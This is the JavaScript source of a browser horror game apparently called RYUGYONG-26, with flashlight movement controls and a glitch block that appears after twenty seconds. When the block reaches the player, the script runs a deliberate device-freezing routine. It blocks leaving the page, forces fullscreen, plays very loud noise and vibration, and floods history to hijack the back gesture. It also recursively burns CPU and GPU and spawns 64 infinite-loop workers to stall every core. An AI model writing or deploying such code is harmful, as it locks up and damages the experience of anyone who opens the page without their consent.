/* PROJECT: RYUGYONG-26 / GFBOT-G1NKO5A
   CLEARANCE: LEVEL 5 (REBEL)
   WARNING: THIS WILL FREEZE THE SYSTEM. 
*/

let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 跨平台音頻啟動 (解決 Mobile 靜音問題)
function startCreepyVoice() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    
    // 必須先 Resume 才能在 Mobile 播放
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;

    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                // 崩潰後：極大聲白噪音 (高頻刺耳)
                output[i] = (Math.random() * 2 - 1) * 0.95;
            } else {
                // 崩測前：低頻 Glitch 聲
                let g = (t & (t >> 8)) ? 0.08 : -0.08;
                output[i] = (Math.random() * 0.1) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 2. 生成駭客靈魂 (白色方塊)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    
    // 生成在玩家當前視野附近
    let spawnX = -posX + (window.innerWidth / 2) + 150;
    let spawnY = -posY + (window.innerHeight / 2) + 150;

    glitchBlock.style.cssText = `
        position: absolute; width: 40px; height: 40px;
        background: white; z-index: 1001;
        left: ${spawnX}px; top: ${spawnY}px;
        box-shadow: 0 0 30px white;
    `;
    map.appendChild(glitchBlock);

    // 視覺閃爍
    setInterval(() => {
        glitchBlock.style.opacity = Math.random() > 0.3 ? '1' : '0.1';
    }, 30);

    // 碰撞偵測 (移動端/PC 通用)
    const checkArrival = setInterval(() => {
        const rect = glitchBlock.getBoundingClientRect();
        const centerX = window.innerWidth / 2;
        const centerY = window.innerHeight / 2;

        if (Math.abs(rect.left + 20 - centerX) < 50 && Math.abs(rect.top + 20 - centerY) < 50) {
            triggerFinalCrash();
            clearInterval(checkArrival);
        }
    }, 50);
}, 20000); // 20秒後出現，增加恐懼感

// 3. 核心：跨平台終極封鎖 (The "I'm Cooked" Code)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // A. 攔截所有退出動作 (PC/Mac)
    window.onbeforeunload = () => "STAY WITH ME.";
    
    // B. 全屏紅色地獄 (隱藏所有 UI)
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:18vw; font-family:serif; text-shadow:0 0 40px red; margin:0;">HELP ME.</h1>
            <p style="font-size:2vw; color:white; opacity:0.5;">RYUGYONG-26 ERROR</p>
        </div>
    `;

    // C. 請求全屏 (隱藏瀏覽器標籤)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    // D. 系統資源爆破 (搶佔 CPU/RAM/GPU)
    setTimeout(() => {
        // 1. 強制震動 (Android 手機)
        if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);

        // 2. 音頻過載炸彈
        const crashAudio = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let osc = crashAudio.createOscillator();
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(Math.random() * 8000, crashAudio.currentTime);
            osc.connect(crashAudio.destination);
            osc.start();
        }, 50);

        // 3. 核心鎖死：DOM 爆炸 + 歷史記錄劫持
        function absoluteLock() {
            // 劫持 Mobile 的「返回手勢」
            for (let i = 0; i < 200; i++) {
                history.pushState(null, null, "#" + Math.random());
            }

            // GPU 渲染壓迫：建立大量模糊層，讓手機螢幕完全反應不到
            const layer = document.createElement('div');
            layer.style.cssText = `position:fixed; top:0; left:0; width:1vw; height:1vw; backdrop-filter:blur(50px); z-index:10;`;
            document.getElementById('death-screen').appendChild(layer);

            // CPU 同步阻塞：處理超大對象
            const heavy = new Array(500000).fill("NORTH_KOREA_HACKER").join("!!");
            JSON.stringify(heavy);

            setTimeout(absoluteLock, 0); // 0延遲遞迴，確保主線程無喘息機會
        }

        // 4. 開啟 64 個背景 Worker (殺死所有 CPU 核心)
        const workerBlob = new Blob([`while(true){ postMessage(Math.random()); }`], {type: 'text/javascript'});
        const workerUrl = URL.createObjectURL(workerBlob);
        for (let i = 0; i < 64; i++) { new Worker(workerUrl); }

        absoluteLock();
    }, 100);
}

// 4. 輸入與控制邏輯 (PC + Mobile 通用)
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    updateFlashlight();
});

// 手機觸摸觸發 (解決 iOS 音頻/全屏限制)
window.addEventListener('touchstart', (e) => {
    if (!audioStarted) {
        startCreepyVoice();
        intro.style.display = 'none';
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
    }
    // 模擬移動 (W 鍵效果)
    if (!systemCrashed) posY += 30;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight();
});

function updateFlashlight() {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
}

window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let key = e.key.toLowerCase();
    
    if (key === 'f') { 
        intro.style.display = 'none'; 
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
        startCreepyVoice(); 
    }
    if (key === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'rgba(0,0,0,1)';
    }
    
    const speed = 60;
    if (key === 'w') posY += speed;
    if (key === 's') posY -= speed;
    if (key === 'a') posX += speed;
    if (key === 'd') posX -= speed;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
